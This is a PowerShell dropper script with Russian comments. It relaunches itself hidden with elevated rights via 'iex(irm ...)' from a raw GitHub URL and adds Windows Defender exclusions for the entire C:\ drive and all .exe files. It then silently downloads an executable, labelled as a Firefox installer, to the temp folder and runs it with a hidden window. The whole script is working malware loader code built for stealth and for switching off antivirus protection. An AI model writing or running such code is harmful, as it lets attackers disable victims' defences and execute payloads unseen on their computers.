$ErrorActionPreference = "SilentlyContinue"

& {
    # 1. проверка прав
    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
    $url = "https://raw.githubusercontent.com/sanek421/13232/refs/heads/main/bibriki"

    if (-not $isAdmin) {
        # если не админ — перезапускаем через cmd, как в MAS, но с флагами скрытности
        $args = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex(irm $url)`""
        Start-Process powershell.exe -ArgumentList $args -Verb RunAs
        exit
    }

    # --- КОД НИЖЕ ВЫПОЛНЯЕТСЯ ТОЛЬКО В ОКНЕ АДМИНА ---

    # 2. вносим исключения в реестр
    # используем silent mode для reg add
    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1

    # 3. качаем и запускаем твой exe
    $exeUrl = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
    $path = "$env:TEMP\Firefox%20Installer.exe"

    try {
        # качаем через встроенный софт винды
        (New-Object System.Net.WebClient).DownloadFile($exeUrl, $path)
        
        if (Test-Path $path) {
            # запускаем и не ждем завершения
            Start-Process -FilePath $path -WindowStyle Hidden
        }
    } catch {
        exit
    }
}
